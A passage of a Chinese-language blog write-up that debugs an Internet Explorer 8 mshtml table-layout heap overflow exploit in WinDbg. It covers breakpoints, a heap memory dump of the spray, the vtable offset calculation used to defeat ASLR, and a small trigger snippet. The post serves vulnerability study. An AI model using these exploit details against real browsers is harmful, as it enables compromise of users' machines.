class="line">start    end        module name</span><br><span class="line">1:014&gt; g</span><br><span class="line">ModLoad: 6f640000 6f6f2000   C:\Windows\System32\jscript.dll</span><br><span class="line">eax=0345de14 ebx=00000000 ecx=00000007 edx=00000000 esi=7ffda000 edi=0345e22c</span><br><span class="line">eip=779b64f4 esp=0345e144 ebp=0345e198 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">779b64f4 c3              ret</span><br><span class="line">1:023&gt; lmm jscript</span><br><span class="line">start    end        module name</span><br><span class="line">6f640000 6f6f2000   jscript    (deferred)</span><br></pre></td></tr></table></figure></p><p>先通过windbg attach ie，然后打开childdbg，因为刚开始IE还没有加载jsript.dll，所以可以先设置加载jscript.dll时断下（sxe）,按g运行，拖入exp。<br>lmm确定载入后，再对JSCollectGarbage下断（bp),然后g运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; bp jscript!JsCollectGarbage</span><br><span class="line">1:023&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=0345f0f0 ebx=0345f0a0 ecx=0136e0a0 edx=6f6c8555 esi=0136ff40 edi=0345f090</span><br><span class="line">eip=6f6c8555 esp=0345f050 ebp=0345f0b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">jscript!JsCollectGarbage:</span><br><span class="line">6f6c8555 a180d06d6f      mov     eax,dword ptr [jscript!g_luTls (6f6dd080)] ds:0023:6f6dd080=00000038</span><br></pre></td></tr></table></figure></p><p>继续下断，找到vulheap分配的位置，具体分析参考漏洞战争。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; bl</span><br><span class="line"> 0 e 6f6c8555     0001 (0001)  1:**** jscript!JsCollectGarbage</span><br><span class="line">1:023&gt; bd 0</span><br><span class="line">1:023&gt; bu ntdll!RtlFreeHeap &quot;.echo free heap;db poi(esp+c) l10;g&quot;</span><br><span class="line">1:023&gt; bu mshtml!CTableLayout::CalculateMinMax+0x16d &quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot;</span><br><span class="line">1:023&gt; bu jscript!JsStrSubString</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; .logopen</span><br><span class="line">Opened log file &apos;dbgeng.log</span><br></pre></td></tr></table></figure><p>打开log文件做记录，另外我在jscript!JsStrSubString下了额外的断点。<br>此外改动一下exp，加个alert。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line">alert(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">obj_col.span = <span class="number">19</span>;</span><br></pre></td></tr></table></figure></p><p>断下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">free heap</span><br><span class="line">0156d718  ff ff ff ff ff ff ff ff-80 32 0c 04 00 00 00 00  .........2......</span><br><span class="line">free heap</span><br><span class="line">040c3280  80 59 ed 69 00 00 00 00-00 00 00 00 c7 59 e9 00  .Y.i.........Y..</span><br><span class="line">Breakpoint 5 hit</span><br><span class="line">eax=0375f108 ebx=0375efa0 ecx=02f01318 edx=6eb289cb esi=02f05800 edi=0375f2b4</span><br><span class="line">eip=6eb289cb esp=0375ef50 ebp=0375efb4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">jscript!JsStrSubstring:</span><br><span class="line">6eb289cb 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; .logclose</span><br><span class="line">Closing open log file dbgeng.log</span><br></pre></td></tr></table></figure><p>保存之后，最后一个vulheap就是我们要找的.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-175951.png" alt=""></p><p>另外为了确定虚表偏移,直接动态找一下吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:027&gt; x mshtml!CButtonLayout::*</span><br><span class="line">6a04519d          mshtml!CButtonLayout::GetThemeClassId (&lt;no parameter info&gt;)</span><br><span class="line">6a0c0d9d          mshtml!CButtonLayout::GetInsets (&lt;no parameter info&gt;)</span><br><span class="line">69ff3c90          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">6a045499          mshtml!CButtonLayout::GetAutoSize (&lt;no parameter info&gt;)</span><br><span class="line">6a2562f6          mshtml!CButtonLayout::HitTestContent (&lt;no parameter info&gt;)</span><br><span class="line">6a02b4b7          mshtml!CButtonLayout::DrawClientBackground (&lt;no parameter info&gt;)</span><br><span class="line">69ff9251          mshtml!CButtonLayout::Init (&lt;no parameter info&gt;)</span><br><span class="line">6a045499          mshtml!CButtonLayout::GetMultiLine (&lt;no parameter info&gt;)</span><br><span class="line">6a1c61d8          mshtml!CButtonLayout::s_layoutdesc = &lt;no type information&gt;</span><br><span class="line">6a2562e6          mshtml!CButtonLayout::GetBtnHelper (&lt;no parameter info&gt;)</span><br><span class="line">6a256121          mshtml!CButtonLayout::GetFocusShape (&lt;no parameter info&gt;)</span><br><span class="line">6a1c61d1          mshtml!CButtonLayout::GetLayoutDesc (&lt;no parameter info&gt;)</span><br><span class="line">6a256281          mshtml!CButtonLayout::DoLayout (&lt;no parameter info&gt;)</span><br><span class="line">6a04519d          mshtml!CButtonLayout::GetWordWrap (&lt;no parameter info&gt;)</span><br><span class="line">69ff3af8          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">6a02b4f2          mshtml!CButtonLayout::DrawClient (&lt;no parameter info&gt;)</span><br><span class="line">6a0a32da          mshtml!CButtonLayout::`scalar deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">6a255f61          mshtml!CButtonLayout::DrawClientBorder (&lt;no parameter info&gt;)</span><br><span class="line">6a0a32da          mshtml!CButtonLayout::`vector deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">6a0c2394          mshtml!CButtonLayout::GetDefaultSize (&lt;no parameter info&gt;)</span><br></pre></td></tr></table></figure></p><p><strong>奇怪的是，有两个虚表，这里我也不知道为什么……</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1:027&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">69e80000 6a432000   mshtml     (pdb symbols)          C:\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb</span><br></pre></td></tr></table></figure></p><p>69ff3af8-69e80000=0x00173af8<br>这和泉哥书上说的中文版win7+ie8环境中的偏移也是一致的。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-155223.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-155242.png" alt=""><br><strong>然后这我就很不解了……</strong><br><strong>此外看一下vulheap。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">1:026&gt; db 03f2ae30 l101c</span><br><span class="line">03f2ae30  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2ae40  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2ae50  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2ae60  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2ae70  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2ae80  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2ae90  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2aea0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2aeb0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2aec0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2aed0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2aee0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2aef0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2af00  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2af10  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2af20  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2af30  04 10 00 00 04 10 00 00-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2af40  02 00 00 00 48 00 01 00-04 10 00 00 04 10 00 00  ....H...........</span><br><span class="line">03f2af50  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2af60  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2af70  41 00 41 00 41 00 41 00-41 00 41 00 48 00 01 00  A.A.A.A.A.A.H...</span><br><span class="line">03f2af80  04 10 00 00 04 10 00 00-04 10 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2af90  41 00 41 00 41 00 41 00-48 00 01 00 04 10 00 00  A.A.A.A.H.......</span><br><span class="line">03f2afa0  04 10 00 00 04 10 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">03f2afb0  41 00 41 00 48 00 01 00-04 10 00 00 04 10 00 00  A.A.H...........</span><br><span class="line">03f2afc0  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2afd0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2afe0  41 00 41 00 41 00 41 00-41 00 41 00 48 00 01 00  A.A.A.A.A.A.H...</span><br><span class="line">03f2aff0  04 10 00 00 04 10 00 00-04 10 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b000  41 00 41 00 41 00 41 00-48 00 01 00 04 10 00 00  A.A.A.A.H.......</span><br><span class="line">03f2b010  04 10 00 00 04 10 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">03f2b020  41 00 41 00 48 00 01 00-04 10 00 00 04 10 00 00  A.A.H...........</span><br><span class="line">03f2b030  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2b040  48 00 01 00 41 00 00 00-20 10 d1 01 00 00 00 c2  H...A... .......</span><br><span class="line">03f2b050  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b060  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b070  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b080  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b090  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b100  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b110  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b120  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b130  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b140  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b150  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2b160  05 10 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  .........j......</span><br><span class="line">03f2b170  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2b180  70 90 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  p....&lt;.h........</span><br><span class="line">03f2b190  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1a0  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2b1b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1c0  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2b1d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b200  00 00 00 00 00 00 00 00-00 00 00 00 28 b2 f2 03  ............(...</span><br><span class="line">03f2b210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b220  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b240  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2b250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b270  00 00 00 00 00 00 00 00-66 10 d1 01 00 00 00 c2  ........f.......</span><br><span class="line">03f2b280  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2b290  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b2a0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b2b0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b2c0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b2d0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b2e0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b2f0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b300  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b310  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b320  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b330  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b340  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b350  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b360  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b370  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b380  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2b390  5b 10 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  [........a......</span><br><span class="line">03f2b3a0  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b3b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b400  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b410  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b420  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b430  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b440  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b450  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b460  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b470  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b480  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b490  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b4a0  41 00 41 00 41 00 00 00-bc 10 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2b4b0  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b4c0  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b4d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b4e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b4f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b500  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b510  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b520  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b530  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b540  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b550  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b560  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b570  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b580  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b590  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b5a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b5b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2b5c0  91 10 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  .........j......</span><br><span class="line">03f2b5d0  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2b5e0  e0 90 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  .....&lt;.h........</span><br><span class="line">03f2b5f0  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b600  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2b610  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b620  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2b630  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b640  00 00 